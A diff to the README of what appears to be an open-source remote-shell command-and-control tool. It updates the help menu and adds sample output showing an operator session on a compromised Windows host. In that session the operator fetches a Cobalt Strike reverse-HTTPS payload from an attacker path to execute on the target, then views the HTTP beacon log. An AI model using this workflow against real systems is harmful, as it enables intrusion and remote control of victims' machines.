@@ -79,7 +79,7 @@ Help Menu
 
         list      args (full)             List all active shells
         interact  args (id)               Interact with a session
-        event     args (log/http, count)  Show http or error log (default number of rows 10)
+        show      args (error/http/event, count)  Show error, http or event log (default number of rows 10)
         kill      args (id)               Kill shell (clear db only)
         exit                              Exit the application
         help                              Show this help menu
@@ -174,6 +174,22 @@ LastLogin    : 8/11/2017 5:58:47 PM
 (x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> exec /home/attacker/cobaltstrike-reverse-https
 [+] Fetching /home/attacker/cobaltstrike-reverse-https
 [+] Payload should be executed shortly on the target
+
+(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> background
+
+(Main)>>> show http
+
+Last 10 lines of log
+-----------------------
+
+192.168.17.1 (Wed Sep 13 17:09:42 2017) [192.168.17.1] POST /?ba1192b6-5dc4-4b75-be3a-e0e9fa819088 HTTP/1.1
+
+192.168.17.1 (Wed Sep 13 17:09:40 2017) [192.168.17.1] POST /?ba1192b6-5dc4-4b75-be3a-e0e9fa819088 HTTP/1.1
+
+192.168.17.1 (Wed Sep 13 17:09:38 2017) [192.168.17.1] POST /?ba1192b6-5dc4-4b75-be3a-e0e9fa819088 HTTP/1.1
+
+192.168.17.1 (Wed Sep 13 17:09:35 2017) [192.168.17.1] POST /?ba1192b6-5dc4-4b75-be3a-e0e9fa819088 HTTP/1.1
+
 ```
 
 # Todo
